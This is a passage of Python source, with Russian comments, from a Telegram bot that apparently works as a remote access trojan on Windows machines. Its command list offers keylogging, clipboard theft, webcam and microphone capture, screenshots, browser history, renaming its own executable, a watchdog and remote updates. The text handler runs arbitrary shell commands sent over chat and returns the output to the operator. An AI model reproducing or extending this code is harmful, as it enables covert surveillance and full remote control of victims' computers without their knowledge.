    """Команда /cleanup_db - очистка дубликатов и оптимизация базы данных"""
    user_id = message.from_user.id
    
    # Только для SuperAdmin
    if not check_permission(user_id, ROLE_SUPER_ADMIN):
        bot.reply_to(message, "❌ Эта команда доступна только для SuperAdmin")
        return
    
    # Запускаем очистку
    bot.reply_to(message, "🧹 Запускаю очистку базы данных...")
    
    try:
        # Выполняем полную очистку
        stats = db.run_complete_cleanup()
        
        # Формируем отчет
        report = f"""
✅ <b>Очистка базы данных завершена</b>

📊 <b>Статистика очистки:</b>
• Удалено дубликатов устройств: {stats.get('device_duplicates_removed', 0)}
• Удалено дубликатов администраторов: {stats.get('admin_duplicates_removed', 0)}
• Удалено старых логов (старше 90 дней): {stats.get('old_logs_removed', 0)}
• Всего удалено записей: {stats.get('total_cleaned', 0)}

💾 <b>База данных оптимизирована</b>
"""
        
        bot.reply_to(message, report, parse_mode='HTML')
        db.log_action(user_id, "cleanup_db_command", f"Stats: {stats}")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка при очистке базы данных: {str(e)}")
        logger.error(f"Ошибка команды cleanup_db: {e}")

# --- КОМАНДА ДЛЯ ПРОСМОТРА ВСЕХ КОМАНД ---

@bot.message_handler(commands=['commands', 'help_all', 'coms'])
@command_handler
def commands_command(message):
    """Команда /commands - список всех доступных команд"""
    user_id = message.from_user.id
    
    commands_text = """
📋 <b>СПИСОК КОМАНД (синхронизированный)</b>

<b>Основные команды:</b>
/pc_list - Список всех зарегистрированных устройств
/admin_list - Список всех администраторов
/urs_update - OTA обновление по ссылке
/wd_download - Загрузка watchdog.exe
/uninstall - Полное удаление бота с устройства
/cleanup_db - Очистка дубликатов в базе данных (только SuperAdmin)
/rename_bot [новое_имя.exe] - Переименовать исполняемый файл бота
/rename_wd [новое_имя.exe] - Переименовать файл watchdog.exe
/rename_pc [новое_имя] - Изменить отображаемое имя устройства
/guide - Подробный справочник по архитектуре (файл)

<b>Мониторинг и информация:</b>
/screen - Скриншот экрана выбранного устройства
/active - Показать активное окно/приложение
/webcam [секунды] - Захват изображения с веб-камеры (по умолчанию 5 сек)
/mic [секунды] - Запись звука с микрофона (по умолчанию 5 сек)
/keyboard - Объединенный лог клавиатуры и буфера обмена
/clipboard - Получение содержимого буфера обмена
/history - История браузера
/app_list - Список установленных приложений
/full_scan - Полное сканирование системы
/deep_scan - Глубокое сканирование системы

<b>Управление процессами и питанием:</b>
/procs - Список процессов выбранного устройства
/kill [имя_процесса] - Завершение процесса
/lock - Блокировка компьютера
/poweroff - Выключение компьютера
/reboot - Перезагрузка компьютера
/wd_on - Запустить watchdog (мониторинг бота)
/wd_off - Остановить watchdog

<b>Системные команды:</b>
/cmd [команда] - Выполнить команду CMD на устройстве
/volume [уровень] - Установка уровня громкости (0-100)
/message [текст] - Отправка сообщения на устройство

<b>Дополнительные команды:</b>
/start - Запуск бота и регистрация устройства
/panel - Панель управления (выбор устройства → команды)
/commands или /coms - Этот список команд
/info - Информация о выбранном устройстве
/add_admin [id] - Добавить администратора (только SuperAdmin)
/del_admin [id] - Удалить администратора (только SuperAdmin)
/setname [имя] - Изменить имя текущего устройства
/update_url [ссылка] - Алиас для /urs_update

<b>Примечание:</b>
• Команды /lock, /poweroff, /reboot, /message, /uninstall требуют подтверждения
• Команда /uninstall требует двойного подтверждения
• Большинство команд работают только на текущем устройстве
• Сначала выберите устройство через /panel
"""
    
    bot.reply_to(message, commands_text, parse_mode='HTML')
    db.log_action(user_id, "commands_command")

# --- КОМАНДА ДЛЯ ДОБАВЛЕНИЯ СЕБЯ КАК АДМИНИСТРАТОРА ---
# Удалена команда /addme, так как она больше не нужна

# --- ОБРАБОТЧИК ТЕКСТОВЫХ СООБЩЕНИЙ ДЛЯ ПОДТВЕРЖДЕНИЯ ОПАСНЫХ ДЕЙСТВИЙ ---
@bot.message_handler(content_types=['text'])
@command_handler
def text_message_handler(message):
    """Обработчик текстовых сообщений для подтверждения опасных действий и интерактивного ввода"""
    user_id = message.from_user.id
    text = message.text.strip()
    
    # Проверяем, ожидает ли пользователь ввода команды CMD
    state = get_user_state(user_id)
    if state and state.get('state') == 'waiting_cmd_input':
        # Обрабатываем ввод команды CMD
        if text.lower() == '/cancel':
            clear_user_state(user_id)
            bot.reply_to(message, "❌ Режим терминала отменен.")
            return
        
        try:
            target_hwid = state.get('data', {}).get('target_hwid')
            
            # Проверяем, что команда выполняется на текущем устройстве
            from bot_core import CURRENT_HWID
            if target_hwid != CURRENT_HWID:
                clear_user_state(user_id)
                bot.reply_to(message, "⚠️ Доступно только для текущего устройства.")
                return
            
            # Выполняем команду
            from bot_services import execute_command
            result = execute_command(text, timeout=30)
            
            # Обрезаем длинный вывод
            if len(result) > 3000:
                result = result[:3000] + "\n... (вывод обрезан)"
            
            # Отправляем результат
            from bot_core import escape_html
            response = f"💻 <b>Результат выполнения команды:</b>\n<code>{escape_html(text)}</code>\n\n"
            response += f"<pre>{escape_html(result)}</pre>"
            
            bot.reply_to(message, response, parse_mode='HTML')
            
            # Логируем действие
            db.log_action(user_id, "execute_cmd", f"Command: {text[:50]}")
            
            # Очищаем состояние
            clear_user_state(user_id)
            return
            
        except Exception as e:
            clear_user_state(user_id)
            bot.reply_to(message, f"❌ Ошибка выполнения команды: {e}")
            return
    
    # Проверяем, ожидает ли пользователь ввода ID для добавления администратора
    if state and state.get('state') == 'waiting_add_admin_id':
        # Обрабатываем ввод ID для добавления администратора
        if text.lower() == '/cancel':
            clear_user_state(user_id)
            bot.reply_to(message, "❌ Добавление администратора отменено.")
            return
        
        try:
            new_admin_id = int(text)
            
            # Проверяем права (должен быть SuperAdmin)
            if not check_permission(user_id, ROLE_SUPER_ADMIN):
                clear_user_state(user_id)
                bot.reply_to(message, "❌ Недостаточно прав. Только SuperAdmin может добавлять администраторов.")
                return
            
            # По умолчанию добавляем как admin (не super_admin)
            role = ROLE_ADMIN
            
            # Проверяем, не пытаемся ли добавить второго SuperAdmin
            if role == ROLE_SUPER_ADMIN:
                all_admins = db.get_all_admins()
                super_admin_count = sum(1 for admin in all_admins if admin.get('role') == ROLE_SUPER_ADMIN)
                if super_admin_count >= 1 and new_admin_id != SUPER_ADMIN_ID:
                    clear_user_state(user_id)
                    bot.reply_to(message, "❌ Можно иметь только одного SuperAdmin (кроме изначального).")
                    return
            
            # Добавляем администратора
            username = f"user_{new_admin_id}"  # Будет обновлено при первом использовании
            if db.add_admin(new_admin_id, username, role):
                bot.reply_to(message, f"✅ Администратор добавлен:\nID: {new_admin_id}\nРоль: {role}")
                db.log_action(user_id, "add_admin", f"Added admin {new_admin_id} with role {role}")
            else:
                bot.reply_to(message, "❌ Ошибка добавления администратора.")
            
            clear_user_state(user_id)
            return
            
        except ValueError:
            bot.reply_to(message, "❌ Неверный формат ID. ID должен быть числом.\nПопробуйте снова или отправьте /cancel для отмены.")
            return
        except Exception as e:
            clear_user_state(user_id)
            bot.reply_to(message, f"❌ Ошибка: {e}")
            return
    
    # Если не обработали как ввод ID, проверяем нижний регистр для подтверждений
    text_lower = text.lower()
    
    # Проверяем, ожидает ли пользователь подтверждения
    if not is_waiting_confirmation(user_id):
        # Если не ожидает подтверждения, игнорируем сообщение
        return
    
    # Обрабатываем подтверждение
    status, command, data = process_confirmation(user_id, text_lower)
    
    if status is True:
        # Подтверждение получено
        # Выполняем команду в зависимости от типа
        if command == 'lock':
            lock_computer()
            bot.reply_to(message, "✅ Компьютер заблокирован")
            send_success_message(message.chat.id, "Блокировка выполнена успешно ✅")
            
        elif command == 'poweroff':
            shutdown_computer()
            bot.reply_to(message, "✅ Компьютер выключается")
            send_success_message(message.chat.id, "Выключение выполнено успешно ✅")
            
        elif command == 'reboot':
            restart_computer()
            bot.reply_to(message, "✅ Компьютер перезагружается")
            send_success_message(message.chat.id, "Перезагрузка выполнена успешно ✅")
            
        elif command == 'rm':
            if data and 'path' in data:
                filepath = data['path']
                try:
                    delete_file(filepath)
                    bot.reply_to(message, f"✅ Файл удален: {filepath}")
                    send_success_message(message.chat.id, "Удаление файла выполнено успешно ✅")
                except Exception as e:
                    bot.reply_to(message, f"❌ Ошибка при удалении файла: {str(e)}")
            else:
                bot.reply_to(message, "❌ Ошибка: путь к файлу не указан")
                
        elif command == 'message':
            if data and 'text' in data:
                message_text = data['text']
                try:
                    show_message_box(message_text)
                    bot.reply_to(message, f"✅ Сообщение отправлено на устройство: {message_text[:100]}...")
                    send_success_message(message.chat.id, "Сообщение отправлено успешно ✅")
                except Exception as e:
                    bot.reply_to(message, f"❌ Ошибка при отправке сообщения: {str(e)}")
            else:
                bot.reply_to(message, "❌ Ошибка: текст сообщения не указан")
        
        elif command == 'uninstall':
            # Выполняем полное удаление бота
            try:
                perform_uninstall()
                bot.reply_to(message, "✅ Бот полностью удален с устройства. Все файлы, записи реестра и автозагрузки очищены.")
                # Не отправляем success_message, так как бот уже удален
            except Exception as e:
                bot.reply_to(message, f"❌ Ошибка при удалении бота: {str(e)}")
        
        # Очищаем состояние пользователя уже выполнено в process_confirmation
        
    elif status == 'next_step':
        # Переход к следующему шагу подтверждения (для команды uninstall)
        state = get_user_state(user_id)
        confirmation_step = state.get('confirmation_step', 'second')
        
        # Отправляем сообщение для следующего шага
        confirmation_msg = get_confirmation_full_message(command, data, confirmation_step=confirmation_step)
        bot.reply_to(message, confirmation_msg, parse_mode='HTML')
        
    elif status is False:
        # Отмена
        reply_msg = bot.reply_to(message, "❌ Операция отменена")
        # Автоудаление сообщения об отмене через 10 секунд
        import asyncio
        import threading
        async def delete_cancellation_message():
            await asyncio.sleep(10)
            try:
                bot.delete_message(message.chat.id, reply_msg.message_id)
            except Exception as e:
                logger.debug(f"Не удалось удалить сообщение об отмене: {e}")
        
        def run_async():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(delete_cancellation_message())
            loop.close()
        
        thread = threading.Thread(target=run_async, daemon=True)
        thread.start()
        
    else:
        # Неверный ввод (status is None)
        bot.reply_to(message, "⚠️ Неверный ввод. Отправьте 'config' для подтверждения или 'cancel' для отмены")